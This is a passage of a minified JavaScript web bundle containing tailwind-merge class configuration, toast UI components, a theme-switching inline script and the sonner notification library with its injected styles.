t=Oe("colors"),e=Oe("spacing"),n=Oe("blur"),r=Oe("brightness"),i=Oe("borderColor"),s=Oe("borderRadius"),o=Oe("borderSpacing"),a=Oe("borderWidth"),c=Oe("contrast"),u=Oe("grayscale"),p=Oe("hueRotate"),f=Oe("invert"),h=Oe("gap"),E=Oe("gradientColorStops"),_=Oe("gradientColorStopPositions"),y=Oe("inset"),C=Oe("margin"),x=Oe("opacity"),w=Oe("padding"),S=Oe("saturate"),N=Oe("scale"),R=Oe("sepia"),j=Oe("skew"),T=Oe("space"),b=Oe("translate"),P=()=>["auto","contain","none"],k=()=>["auto","hidden","clip","visible","scroll"],O=()=>["auto",re,e],D=()=>[re,e],A=()=>["",pr,qr],V=()=>["auto",po,re],Z=()=>["bottom","center","left","left-bottom","left-top","right","right-bottom","right-top","top"],q=()=>["solid","dashed","dotted","double","none"],J=()=>["normal","multiply","screen","overlay","darken","lighten","color-dodge","color-burn","hard-light","soft-light","difference","exclusion","hue","saturation","color","luminosity"],L=()=>["start","end","center","between","around","evenly","stretch"],z=()=>["","0",re],Y=()=>["auto","avoid","all","avoid-page","page","left","right","column"],K=()=>[po,re];return{cacheSize:500,separator:":",theme:{colors:[za],spacing:[pr,qr],blur:["none","",Yr,re],brightness:K(),borderColor:[t],borderRadius:["none","","full",Yr,re],borderSpacing:D(),borderWidth:A(),contrast:K(),grayscale:z(),hueRotate:K(),invert:z(),gap:D(),gradientColorStops:[t],gradientColorStopPositions:[b2,qr],inset:O(),margin:O(),opacity:K(),padding:D(),saturate:K(),scale:K(),sepia:z(),skew:K(),space:D(),translate:D()},classGroups:{aspect:[{aspect:["auto","square","video",re]}],container:["container"],columns:[{columns:[Yr]}],"break-after":[{"break-after":Y()}],"break-before":[{"break-before":Y()}],"break-inside":[{"break-inside":["auto","avoid","avoid-page","avoid-column"]}],"box-decoration":[{"box-decoration":["slice","clone"]}],box:[{box:["border","content"]}],display:["block","inline-block","inline","flex","inline-flex","table","inline-table","table-caption","table-cell","table-column","table-column-group","table-footer-group","table-header-group","table-row-group","table-row","flow-root","grid","inline-grid","contents","list-item","hidden"],float:[{float:["right","left","none","start","end"]}],clear:[{clear:["left","right","both","none","start","end"]}],isolation:["isolate","isolation-auto"],"object-fit":[{object:["contain","cover","fill","none","scale-down"]}],"object-position":[{object:[...Z(),re]}],overflow:[{overflow:k()}],"overflow-x":[{"overflow-x":k()}],"overflow-y":[{"overflow-y":k()}],overscroll:[{overscroll:P()}],"overscroll-x":[{"overscroll-x":P()}],"overscroll-y":[{"overscroll-y":P()}],position:["static","fixed","absolute","relative","sticky"],inset:[{inset:[y]}],"inset-x":[{"inset-x":[y]}],"inset-y":[{"inset-y":[y]}],start:[{start:[y]}],end:[{end:[y]}],top:[{top:[y]}],right:[{right:[y]}],bottom:[{bottom:[y]}],left:[{left:[y]}],visibility:["visible","invisible","collapse"],z:[{z:["auto",$a,re]}],basis:[{basis:O()}],"flex-direction":[{flex:["row","row-reverse","col","col-reverse"]}],"flex-wrap":[{flex:["wrap","wrap-reverse","nowrap"]}],flex:[{flex:["1","auto","initial","none",re]}],grow:[{grow:z()}],shrink:[{shrink:z()}],order:[{order:["first","last","none",$a,re]}],"grid-cols":[{"grid-cols":[za]}],"col-start-end":[{col:["auto",{span:["full",$a,re]},re]}],"col-start":[{"col-start":V()}],"col-end":[{"col-end":V()}],"grid-rows":[{"grid-rows":[za]}],"row-start-end":[{row:["auto",{span:[$a,re]},re]}],"row-start":[{"row-start":V()}],"row-end":[{"row-end":V()}],"grid-flow":[{"grid-flow":["row","col","dense","row-dense","col-dense"]}],"auto-cols":[{"auto-cols":["auto","min","max","fr",re]}],"auto-rows":[{"auto-rows":["auto","min","max","fr",re]}],gap:[{gap:[h]}],"gap-x":[{"gap-x":[h]}],"gap-y":[{"gap-y":[h]}],"justify-content":[{justify:["normal",...L()]}],"justify-items":[{"justify-items":["start","end","center","stretch"]}],"justify-self":[{"justify-self":["auto","start","end","center","stretch"]}],"align-content":[{content:["normal",...L(),"baseline"]}],"align-items":[{items:["start","end","center","baseline","stretch"]}],"align-self":[{self:["auto","start","end","center","stretch","baseline"]}],"place-content":[{"place-content":[...L(),"baseline"]}],"place-items":[{"place-items":["start","end","center","baseline","stretch"]}],"place-self":[{"place-self":["auto","start","end","center","stretch"]}],p:[{p:[w]}],px:[{px:[w]}],py:[{py:[w]}],ps:[{ps:[w]}],pe:[{pe:[w]}],pt:[{pt:[w]}],pr:[{pr:[w]}],pb:[{pb:[w]}],pl:[{pl:[w]}],m:[{m:[C]}],mx:[{mx:[C]}],my:[{my:[C]}],ms:[{ms:[C]}],me:[{me:[C]}],mt:[{mt:[C]}],mr:[{mr:[C]}],mb:[{mb:[C]}],ml:[{ml:[C]}],"space-x":[{"space-x":[T]}],"space-x-reverse":["space-x-reverse"],"space-y":[{"space-y":[T]}],"space-y-reverse":["space-y-reverse"],w:[{w:["auto","min","max","fit","svw","lvw","dvw",re,e]}],"min-w":[{"min-w":[re,e,"min","max","fit"]}],"max-w":[{"max-w":[re,e,"none","full","min","max","fit","prose",{screen:[Yr]},Yr]}],h:[{h:[re,e,"auto","min","max","fit","svh","lvh","dvh"]}],"min-h":[{"min-h":[re,e,"min","max","fit","svh","lvh","dvh"]}],"max-h":[{"max-h":[re,e,"min","max","fit","svh","lvh","dvh"]}],size:[{size:[re,e,"auto","min","max","fit"]}],"font-size":[{text:["base",Yr,qr]}],"font-smoothing":["antialiased","subpixel-antialiased"],"font-style":["italic","not-italic"],"font-weight":[{font:["thin","extralight","light","normal","medium","semibold","bold","extrabold","black",Qf]}],"font-family":[{font:[za]}],"fvn-normal":["normal-nums"],"fvn-ordinal":["ordinal"],"fvn-slashed-zero":["slashed-zero"],"fvn-figure":["lining-nums","oldstyle-nums"],"fvn-spacing":["proportional-nums","tabular-nums"],"fvn-fraction":["diagonal-fractions","stacked-fractons"],tracking:[{tracking:["tighter","tight","normal","wide","wider","widest",re]}],"line-clamp":[{"line-clamp":["none",po,Qf]}],leading:[{leading:["none","tight","snug","normal","relaxed","loose",pr,re]}],"list-image":[{"list-image":["none",re]}],"list-style-type":[{list:["none","disc","decimal",re]}],"list-style-position":[{list:["inside","outside"]}],"placeholder-color":[{placeholder:[t]}],"placeholder-opacity":[{"placeholder-opacity":[x]}],"text-alignment":[{text:["left","center","right","justify","start","end"]}],"text-color":[{text:[t]}],"text-opacity":[{"text-opacity":[x]}],"text-decoration":["underline","overline","line-through","no-underline"],"text-decoration-style":[{decoration:[...q(),"wavy"]}],"text-decoration-thickness":[{decoration:["auto","from-font",pr,qr]}],"underline-offset":[{"underline-offset":["auto",pr,re]}],"text-decoration-color":[{decoration:[t]}],"text-transform":["uppercase","lowercase","capitalize","normal-case"],"text-overflow":["truncate","text-ellipsis","text-clip"],"text-wrap":[{text:["wrap","nowrap","balance","pretty"]}],indent:[{indent:D()}],"vertical-align":[{align:["baseline","top","middle","bottom","text-top","text-bottom","sub","super",re]}],whitespace:[{whitespace:["normal","nowrap","pre","pre-line","pre-wrap","break-spaces"]}],break:[{break:["normal","words","all","keep"]}],hyphens:[{hyphens:["none","manual","auto"]}],content:[{content:["none",re]}],"bg-attachment":[{bg:["fixed","local","scroll"]}],"bg-clip":[{"bg-clip":["border","padding","content","text"]}],"bg-opacity":[{"bg-opacity":[x]}],"bg-origin":[{"bg-origin":["border","padding","content"]}],"bg-position":[{bg:[...Z(),N2]}],"bg-repeat":[{bg:["no-repeat",{repeat:["","x","y","round","space"]}]}],"bg-size":[{bg:["auto","cover","contain",I2]}],"bg-image":[{bg:["none",{"gradient-to":["t","tr","r","br","b","bl","l","tl"]},P2]}],"bg-color":[{bg:[t]}],"gradient-from-pos":[{from:[_]}],"gradient-via-pos":[{via:[_]}],"gradient-to-pos":[{to:[_]}],"gradient-from":[{from:[E]}],"gradient-via":[{via:[E]}],"gradient-to":[{to:[E]}],rounded:[{rounded:[s]}],"rounded-s":[{"rounded-s":[s]}],"rounded-e":[{"rounded-e":[s]}],"rounded-t":[{"rounded-t":[s]}],"rounded-r":[{"rounded-r":[s]}],"rounded-b":[{"rounded-b":[s]}],"rounded-l":[{"rounded-l":[s]}],"rounded-ss":[{"rounded-ss":[s]}],"rounded-se":[{"rounded-se":[s]}],"rounded-ee":[{"rounded-ee":[s]}],"rounded-es":[{"rounded-es":[s]}],"rounded-tl":[{"rounded-tl":[s]}],"rounded-tr":[{"rounded-tr":[s]}],"rounded-br":[{"rounded-br":[s]}],"rounded-bl":[{"rounded-bl":[s]}],"border-w":[{border:[a]}],"border-w-x":[{"border-x":[a]}],"border-w-y":[{"border-y":[a]}],"border-w-s":[{"border-s":[a]}],"border-w-e":[{"border-e":[a]}],"border-w-t":[{"border-t":[a]}],"border-w-r":[{"border-r":[a]}],"border-w-b":[{"border-b":[a]}],"border-w-l":[{"border-l":[a]}],"border-opacity":[{"border-opacity":[x]}],"border-style":[{border:[...q(),"hidden"]}],"divide-x":[{"divide-x":[a]}],"divide-x-reverse":["divide-x-reverse"],"divide-y":[{"divide-y":[a]}],"divide-y-reverse":["divide-y-reverse"],"divide-opacity":[{"divide-opacity":[x]}],"divide-style":[{divide:q()}],"border-color":[{border:[i]}],"border-color-x":[{"border-x":[i]}],"border-color-y":[{"border-y":[i]}],"border-color-s":[{"border-s":[i]}],"border-color-e":[{"border-e":[i]}],"border-color-t":[{"border-t":[i]}],"border-color-r":[{"border-r":[i]}],"border-color-b":[{"border-b":[i]}],"border-color-l":[{"border-l":[i]}],"divide-color":[{divide:[i]}],"outline-style":[{outline:["",...q()]}],"outline-offset":[{"outline-offset":[pr,re]}],"outline-w":[{outline:[pr,qr]}],"outline-color":[{outline:[t]}],"ring-w":[{ring:A()}],"ring-w-inset":["ring-inset"],"ring-color":[{ring:[t]}],"ring-opacity":[{"ring-opacity":[x]}],"ring-offset-w":[{"ring-offset":[pr,qr]}],"ring-offset-color":[{"ring-offset":[t]}],shadow:[{shadow:["","inner","none",Yr,R2]}],"shadow-color":[{shadow:[za]}],opacity:[{opacity:[x]}],"mix-blend":[{"mix-blend":[...J(),"plus-lighter","plus-darker"]}],"bg-blend":[{"bg-blend":J()}],filter:[{filter:["","none"]}],blur:[{blur:[n]}],brightness:[{brightness:[r]}],contrast:[{contrast:[c]}],"drop-shadow":[{"drop-shadow":["","none",Yr,re]}],grayscale:[{grayscale:[u]}],"hue-rotate":[{"hue-rotate":[p]}],invert:[{invert:[f]}],saturate:[{saturate:[S]}],sepia:[{sepia:[R]}],"backdrop-filter":[{"backdrop-filter":["","none"]}],"backdrop-blur":[{"backdrop-blur":[n]}],"backdrop-brightness":[{"backdrop-brightness":[r]}],"backdrop-contrast":[{"backdrop-contrast":[c]}],"backdrop-grayscale":[{"backdrop-grayscale":[u]}],"backdrop-hue-rotate":[{"backdrop-hue-rotate":[p]}],"backdrop-invert":[{"backdrop-invert":[f]}],"backdrop-opacity":[{"backdrop-opacity":[x]}],"backdrop-saturate":[{"backdrop-saturate":[S]}],"backdrop-sepia":[{"backdrop-sepia":[R]}],"border-collapse":[{border:["collapse","separate"]}],"border-spacing":[{"border-spacing":[o]}],"border-spacing-x":[{"border-spacing-x":[o]}],"border-spacing-y":[{"border-spacing-y":[o]}],"table-layout":[{table:["auto","fixed"]}],caption:[{caption:["top","bottom"]}],transition:[{transition:["none","all","","colors","opacity","shadow","transform",re]}],duration:[{duration:K()}],ease:[{ease:["linear","in","out","in-out",re]}],delay:[{delay:K()}],animate:[{animate:["none","spin","ping","pulse","bounce",re]}],transform:[{transform:["","gpu","none"]}],scale:[{scale:[N]}],"scale-x":[{"scale-x":[N]}],"scale-y":[{"scale-y":[N]}],rotate:[{rotate:[$a,re]}],"translate-x":[{"translate-x":[b]}],"translate-y":[{"translate-y":[b]}],"skew-x":[{"skew-x":[j]}],"skew-y":[{"skew-y":[j]}],"transform-origin":[{origin:["center","top","top-right","right","bottom-right","bottom","bottom-left","left","top-left",re]}],accent:[{accent:["auto",t]}],appearance:[{appearance:["none","auto"]}],cursor:[{cursor:["auto","default","pointer","wait","text","move","help","not-allowed","none","context-menu","progress","cell","crosshair","vertical-text","alias","copy","no-drop","grab","grabbing","all-scroll","col-resize","row-resize","n-resize","e-resize","s-resize","w-resize","ne-resize","nw-resize","se-resize","sw-resize","ew-resize","ns-resize","nesw-resize","nwse-resize","zoom-in","zoom-out",re]}],"caret-color":[{caret:[t]}],"pointer-events":[{"pointer-events":["none","auto"]}],resize:[{resize:["none","y","x",""]}],"scroll-behavior":[{scroll:["auto","smooth"]}],"scroll-m":[{"scroll-m":D()}],"scroll-mx":[{"scroll-mx":D()}],"scroll-my":[{"scroll-my":D()}],"scroll-ms":[{"scroll-ms":D()}],"scroll-me":[{"scroll-me":D()}],"scroll-mt":[{"scroll-mt":D()}],"scroll-mr":[{"scroll-mr":D()}],"scroll-mb":[{"scroll-mb":D()}],"scroll-ml":[{"scroll-ml":D()}],"scroll-p":[{"scroll-p":D()}],"scroll-px":[{"scroll-px":D()}],"scroll-py":[{"scroll-py":D()}],"scroll-ps":[{"scroll-ps":D()}],"scroll-pe":[{"scroll-pe":D()}],"scroll-pt":[{"scroll-pt":D()}],"scroll-pr":[{"scroll-pr":D()}],"scroll-pb":[{"scroll-pb":D()}],"scroll-pl":[{"scroll-pl":D()}],"snap-align":[{snap:["start","end","center","align-none"]}],"snap-stop":[{snap:["normal","always"]}],"snap-type":[{snap:["none","x","y","both"]}],"snap-strictness":[{snap:["mandatory","proximity"]}],touch:[{touch:["auto","none","manipulation"]}],"touch-x":[{"touch-pan":["x","left","right"]}],"touch-y":[{"touch-pan":["y","up","down"]}],"touch-pz":["touch-pinch-zoom"],select:[{select:["none","text","all","auto"]}],"will-change":[{"will-change":["auto","scroll","contents","transform",re]}],fill:[{fill:[t,"none"]}],"stroke-w":[{stroke:[pr,qr,Qf]}],stroke:[{stroke:[t,"none"]}],sr:["sr-only","not-sr-only"],"forced-color-adjust":[{"forced-color-adjust":["auto","none"]}]},conflictingClassGroups:{overflow:["overflow-x","overflow-y"],overscroll:["overscroll-x","overscroll-y"],inset:["inset-x","inset-y","start","end","top","right","bottom","left"],"inset-x":["right","left"],"inset-y":["top","bottom"],flex:["basis","grow","shrink"],gap:["gap-x","gap-y"],p:["px","py","ps","pe","pt","pr","pb","pl"],px:["pr","pl"],py:["pt","pb"],m:["mx","my","ms","me","mt","mr","mb","ml"],mx:["mr","ml"],my:["mt","mb"],size:["w","h"],"font-size":["leading"],"fvn-normal":["fvn-ordinal","fvn-slashed-zero","fvn-figure","fvn-spacing","fvn-fraction"],"fvn-ordinal":["fvn-normal"],"fvn-slashed-zero":["fvn-normal"],"fvn-figure":["fvn-normal"],"fvn-spacing":["fvn-normal"],"fvn-fraction":["fvn-normal"],"line-clamp":["display","overflow"],rounded:["rounded-s","rounded-e","rounded-t","rounded-r","rounded-b","rounded-l","rounded-ss","rounded-se","rounded-ee","rounded-es","rounded-tl","rounded-tr","rounded-br","rounded-bl"],"rounded-s":["rounded-ss","rounded-es"],"rounded-e":["rounded-se","rounded-ee"],"rounded-t":["rounded-tl","rounded-tr"],"rounded-r":["rounded-tr","rounded-br"],"rounded-b":["rounded-br","rounded-bl"],"rounded-l":["rounded-tl","rounded-bl"],"border-spacing":["border-spacing-x","border-spacing-y"],"border-w":["border-w-s","border-w-e","border-w-t","border-w-r","border-w-b","border-w-l"],"border-w-x":["border-w-r","border-w-l"],"border-w-y":["border-w-t","border-w-b"],"border-color":["border-color-s","border-color-e","border-color-t","border-color-r","border-color-b","border-color-l"],"border-color-x":["border-color-r","border-color-l"],"border-color-y":["border-color-t","border-color-b"],"scroll-m":["scroll-mx","scroll-my","scroll-ms","scroll-me","scroll-mt","scroll-mr","scroll-mb","scroll-ml"],"scroll-mx":["scroll-mr","scroll-ml"],"scroll-my":["scroll-mt","scroll-mb"],"scroll-p":["scroll-px","scroll-py","scroll-ps","scroll-pe","scroll-pt","scroll-pr","scroll-pb","scroll-pl"],"scroll-px":["scroll-pr","scroll-pl"],"scroll-py":["scroll-pt","scroll-pb"],touch:["touch-x","touch-y","touch-pz"],"touch-x":["touch"],"touch-y":["touch"],"touch-pz":["touch"]},conflictingClassGroupModifiers:{"font-size":["leading"]}}},M2=v2(j2);function fe(...t){return M2(s1(t))}const L2=YA,g1=v.forwardRef(({className:t,...e},n)=>d.jsx(JS,{ref:n,className:fe("fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]",t),...e}));g1.displayName=JS.displayName;const F2=_h("group pointer-events-auto relative flex w-full items-center justify-between space-x-4 overflow-hidden rounded-md border p-6 pr-8 shadow-lg transition-all data-[swipe=cancel]:translate-x-0 data-[swipe=end]:translate-x-[var(--radix-toast-swipe-end-x)] data-[swipe=move]:translate-x-[var(--radix-toast-swipe-move-x)] data-[swipe=move]:transition-none data-[state=open]:animate-in data-[state=closed]:animate-out data-[swipe=end]:animate-out data-[state=closed]:fade-out-80 data-[state=closed]:slide-out-to-right-full data-[state=open]:slide-in-from-top-full data-[state=open]:sm:slide-in-from-bottom-full",{variants:{variant:{default:"border bg-background text-foreground",destructive:"destructive group border-destructive bg-destructive text-destructive-foreground"}},defaultVariants:{variant:"default"}}),v1=v.forwardRef(({className:t,variant:e,...n},r)=>d.jsx(ZS,{ref:r,className:fe(F2({variant:e}),t),...n}));v1.displayName=ZS.displayName;const U2=v.forwardRef(({className:t,...e},n)=>d.jsx(n1,{ref:n,className:fe("inline-flex h-8 shrink-0 items-center justify-center rounded-md border bg-transparent px-3 text-sm font-medium ring-offset-background transition-colors hover:bg-secondary focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 group-[.destructive]:border-muted/40 group-[.destructive]:hover:border-destructive/30 group-[.destructive]:hover:bg-destructive group-[.destructive]:hover:text-destructive-foreground group-[.destructive]:focus:ring-destructive",t),...e}));U2.displayName=n1.displayName;const y1=v.forwardRef(({className:t,...e},n)=>d.jsx(r1,{ref:n,className:fe("absolute right-2 top-2 rounded-md p-1 text-foreground/50 opacity-0 transition-opacity hover:text-foreground focus:opacity-100 focus:outline-none focus:ring-2 group-hover:opacity-100 group-[.destructive]:text-red-300 group-[.destructive]:hover:text-red-50 group-[.destructive]:focus:ring-red-400 group-[.destructive]:focus:ring-offset-red-600",t),"toast-close":"",...e,children:d.jsx(lc,{className:"h-4 w-4"})}));y1.displayName=r1.displayName;const _1=v.forwardRef(({className:t,...e},n)=>d.jsx(e1,{ref:n,className:fe("text-sm font-semibold",t),...e}));_1.displayName=e1.displayName;const w1=v.forwardRef(({className:t,...e},n)=>d.jsx(t1,{ref:n,className:fe("text-sm opacity-90",t),...e}));w1.displayName=t1.displayName;function $2(){const{toasts:t}=oA();return d.jsxs(L2,{children:[t.map(function({id:e,title:n,description:r,action:i,...s}){return d.jsxs(v1,{...s,children:[d.jsxs("div",{className:"grid gap-1",children:[n&&d.jsx(_1,{children:n}),r&&d.jsx(w1,{children:r})]}),i,d.jsx(y1,{})]},e)}),d.jsx(g1,{})]})}var Z_=["light","dark"],z2="(prefers-color-scheme: dark)",B2=v.createContext(void 0),V2={setTheme:t=>{},themes:[]},H2=()=>{var t;return(t=v.useContext(B2))!=null?t:V2};v.memo(({forcedTheme:t,storageKey:e,attribute:n,enableSystem:r,enableColorScheme:i,defaultTheme:s,value:o,attrs:a,nonce:c})=>{let u=s==="system",p=n==="class"?`var d=document.documentElement,c=d.classList;${`c.remove(${a.map(_=>`'${_}'`).join(",")})`};`:`var d=document.documentElement,n='${n}',s='setAttribute';`,f=i?Z_.includes(s)&&s?`if(e==='light'||e==='dark'||!e)d.style.colorScheme=e||'${s}'`:"if(e==='light'||e==='dark')d.style.colorScheme=e":"",h=(_,y=!1,C=!0)=>{let x=o?o[_]:_,w=y?_+"|| ''":`'${x}'`,S="";return i&&C&&!y&&Z_.includes(_)&&(S+=`d.style.colorScheme = '${_}';`),n==="class"?y||x?S+=`c.add(${w})`:S+="null":x&&(S+=`d[s](n,${w})`),S},E=t?`!function(){${p}${h(t)}}()`:r?`!function(){try{${p}var e=localStorage.getItem('${e}');if('system'===e||(!e&&${u})){var t='${z2}',m=window.matchMedia(t);if(m.media!==t||m.matches){${h("dark")}}else{${h("light")}}}else if(e){${o?`var x=${JSON.stringify(o)};`:""}${h(o?"x[e]":"e",!0)}}${u?"":"else{"+h(s,!1,!1)+"}"}${f}}catch(e){}}()`:`!function(){try{${p}var e=localStorage.getItem('${e}');if(e){${o?`var x=${JSON.stringify(o)};`:""}${h(o?"x[e]":"e",!0)}}else{${h(s,!1,!1)};}${f}}catch(t){}}();`;return v.createElement("script",{nonce:c,dangerouslySetInnerHTML:{__html:E}})});var W2=t=>{switch(t){case"success":return q2;case"info":return Q2;case"warning":return Y2;case"error":return X2;default:return null}},K2=Array(12).fill(0),G2=({visible:t})=>H.createElement("div",{className:"sonner-loading-wrapper","data-visible":t},H.createElement("div",{className:"sonner-spinner"},K2.map((e,n)=>H.createElement("div",{className:"sonner-loading-bar",key:`spinner-bar-${n}`})))),q2=H.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 20 20",fill:"currentColor",height:"20",width:"20"},H.createElement("path",{fillRule:"evenodd",d:"M10 18a8 8 0 100-16 8 8 0 000 16zm3.857-9.809a.75.75 0 00-1.214-.882l-3.483 4.79-1.88-1.88a.75.75 0 10-1.06 1.061l2.5 2.5a.75.75 0 001.137-.089l4-5.5z",clipRule:"evenodd"})),Y2=H.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 24 24",fill:"currentColor",height:"20",width:"20"},H.createElement("path",{fillRule:"evenodd",d:"M9.401 3.003c1.155-2 4.043-2 5.197 0l7.355 12.748c1.154 2-.29 4.5-2.599 4.5H4.645c-2.309 0-3.752-2.5-2.598-4.5L9.4 3.003zM12 8.25a.75.75 0 01.75.75v3.75a.75.75 0 01-1.5 0V9a.75.75 0 01.75-.75zm0 8.25a.75.75 0 100-1.5.75.75 0 000 1.5z",clipRule:"evenodd"})),Q2=H.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 20 20",fill:"currentColor",height:"20",width:"20"},H.createElement("path",{fillRule:"evenodd",d:"M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a.75.75 0 000 1.5h.253a.25.25 0 01.244.304l-.459 2.066A1.75 1.75 0 0010.747 15H11a.75.75 0 000-1.5h-.253a.25.25 0 01-.244-.304l.459-2.066A1.75 1.75 0 009.253 9H9z",clipRule:"evenodd"})),X2=H.createElement("svg",{xmlns:"http://www.w3.org/2000/svg",viewBox:"0 0 20 20",fill:"currentColor",height:"20",width:"20"},H.createElement("path",{fillRule:"evenodd",d:"M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-8-5a.75.75 0 01.75.75v4.5a.75.75 0 01-1.5 0v-4.5A.75.75 0 0110 5zm0 10a1 1 0 100-2 1 1 0 000 2z",clipRule:"evenodd"})),J2=()=>{let[t,e]=H.useState(document.hidden);return H.useEffect(()=>{let n=()=>{e(document.hidden)};return document.addEventListener("visibilitychange",n),()=>window.removeEventListener("visibilitychange",n)},[]),t},Tm=1,Z2=class{constructor(){this.subscribe=t=>(this.subscribers.push(t),()=>{let e=this.subscribers.indexOf(t);this.subscribers.splice(e,1)}),this.publish=t=>{this.subscribers.forEach(e=>e(t))},this.addToast=t=>{this.publish(t),this.toasts=[...this.toasts,t]},this.create=t=>{var e;let{message:n,...r}=t,i=typeof(t==null?void 0:t.id)=="number"||((e=t.id)==null?void 0:e.length)>0?t.id:Tm++,s=this.toasts.find(a=>a.id===i),o=t.dismissible===void 0?!0:t.dismissible;return s?this.toasts=this.toasts.map(a=>a.id===i?(this.publish({...a,...t,id:i,title:n}),{...a,...t,id:i,dismissible:o,title:n}):a):this.addToast({title:n,...r,dismissible:o,id:i}),i},this.dismiss=t=>(t||this.toasts.forEach(e=>{this.subscribers.forEach(n=>n({id:e.id,dismiss:!0}))}),this.subscribers.forEach(e=>e({id:t,dismiss:!0})),t),this.message=(t,e)=>this.create({...e,message:t}),this.error=(t,e)=>this.create({...e,message:t,type:"error"}),this.success=(t,e)=>this.create({...e,type:"success",message:t}),this.info=(t,e)=>this.create({...e,type:"info",message:t}),this.warning=(t,e)=>this.create({...e,type:"warning",message:t}),this.loading=(t,e)=>this.create({...e,type:"loading",message:t}),this.promise=(t,e)=>{if(!e)return;let n;e.loading!==void 0&&(n=this.create({...e,promise:t,type:"loading",message:e.loading,description:typeof e.description!="function"?e.description:void 0}));let r=t instanceof Promise?t:t(),i=n!==void 0;return r.then(async s=>{if(tO(s)&&!s.ok){i=!1;let o=typeof e.error=="function"?await e.error(`HTTP error! status: ${s.status}`):e.error,a=typeof e.description=="function"?await e.description(`HTTP error! status: ${s.status}`):e.description;this.create({id:n,type:"error",message:o,description:a})}else if(e.success!==void 0){i=!1;let o=typeof e.success=="function"?await e.success(s):e.success,a=typeof e.description=="function"?await e.description(s):e.description;this.create({id:n,type:"success",message:o,description:a})}}).catch(async s=>{if(e.error!==void 0){i=!1;let o=typeof e.error=="function"?await e.error(s):e.error,a=typeof e.description=="function"?await e.description(s):e.description;this.create({id:n,type:"error",message:o,description:a})}}).finally(()=>{var s;i&&(this.dismiss(n),n=void 0),(s=e.finally)==null||s.call(e)}),n},this.custom=(t,e)=>{let n=(e==null?void 0:e.id)||Tm++;return this.create({jsx:t(n),id:n,...e}),n},this.subscribers=[],this.toasts=[]}},Yt=new Z2,eO=(t,e)=>{let n=(e==null?void 0:e.id)||Tm++;return Yt.addToast({title:t,...e,id:n}),n},tO=t=>t&&typeof t=="object"&&"ok"in t&&typeof t.ok=="boolean"&&"status"in t&&typeof t.status=="number",nO=eO,rO=()=>Yt.toasts;Object.assign(nO,{success:Yt.success,info:Yt.info,warning:Yt.warning,error:Yt.error,custom:Yt.custom,message:Yt.message,promise:Yt.promise,dismiss:Yt.dismiss,loading:Yt.loading},{getHistory:rO});function iO(t,{insertAt:e}={}){if(typeof document>"u")return;let n=document.head||document.getElementsByTagName("head")[0],r=document.createElement("style");r.type="text/css",e==="top"&&n.firstChild?n.insertBefore(r,n.firstChild):n.appendChild(r),r.styleSheet?r.styleSheet.cssText=t:r.appendChild(document.createTextNode(t))}iO(`:where(html[dir="ltr"]),:where([data-sonner-toaster][dir="ltr"]){--toast-icon-margin-start: -3px;--toast-icon-margin-end: 4px;--toast-svg-margin-start: -1px;--toast-svg-margin-end: 0px;--toast-button-margin-start: auto;--toast-button-margin-end: 0;--toast-close-button-start: 0;--toast-close-button-end: unset;--toast-close-button-transform: translate(-35%, -35%)}:where(html[dir="rtl"]),:where([data-sonner-toaster][dir="rtl"]){--toast-icon-margin-start: 4px;--toast-icon-margin-end: -3px;--toast-svg-margin-start: 0px;--toast-svg-margin-end: -1px;--toast-button-margin-start: 0;--toast-button-margin-end: auto;--toast-close-button-start: unset;--toast-close-button-end: 0;--toast-close-button-transform: translate(35%, -35%)}:where([data-sonner-toaster]){position:fixed;width:var(--width);font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;--gray1: hsl(0, 0%, 99%);--gray2: hsl(0, 0%, 97.3%);--gray3: hsl(0, 0%, 95.1%);--gray4: hsl(0, 0%, 93%);--gray5: hsl(0, 0%, 90.9%);--gray6: hsl(0, 0%, 88.7%);--gray7: hsl(0, 0%, 85.8%);--gray8: hsl(0, 0%, 78%);--gray9: hsl(0, 0%, 56.1%);--gray10: hsl(0, 0%, 52.3%);--gray11: hsl(0, 0%, 43.5%);--gray12: hsl(0, 0%, 9%);--border-radius: 8px;box-sizing:border-box;padding:0;margin:0;list-style:none;outline:none;z-index:999999999}:where([data-sonner-toaster][data-x-position="right"]){right:max(var(--offset),env(safe-area-inset-right))}:where([data-sonner-toaster][data-x-position="left"]){left:max(var(--offset),env(safe-area-inset-left))}:where([data-sonner-toaster][data-x-position="center"]){left:50%;transform:translate(-50%)}:where([data-sonner-toaster][data-y-position="top"]){top:max(var(--offset),env(safe-area-inset-top))}:where([data-sonner-toaster][data-y-position="bottom"]){bottom:max(var(--offset),env(safe-area-inset-bottom))}:where([data-sonner-toast]){--y: translateY(100%);--lift-amount: calc(var(--lift) * var(--gap));z-index:var(--z-index);position:absolute;opacity:0;transform:var(--y);filter:blur(0);touch-action:none;transition:transform .4s,opacity .4s,height .4s,box-shadow .2s;box-sizing:border-box;outline:none;overflow-wrap:anywhere}:where([data-sonner-toast][data-styled="true"]){padding:16px;background:var(--normal-bg);border:1px solid var(--normal-border);color:var(--normal-text);border-radius:var(--border-radius);box-shadow:0 4px 12px #0000001a;width:var(--width);font-size:13px;display:flex;align-items:center;gap:6px}:where([data-sonner-toast]:focus-visible){box-shadow:0 4px 12px #0000001a,0 0 0 2px #0003}:where([data-sonner-toast][data-y-position="top"]){top:0;--y: translateY(-100%);--lift: 1;--lift-amount: calc(1 * var(--gap))}:where([data-sonner-toast][data-y-position="bottom"]){bottom:0;--y: translateY(100%);--lift: -1;--lift-amount: calc(var(--lift) * var(--gap))}:where([data-sonner-toast]) :where([data-description]){font-weight:400;line-height:1.4;color:inherit}:where([data-sonner-toast]) :where([data-title]){font-weight:500;line-height:1.5;color:inherit}:where([data-sonner-toast]) 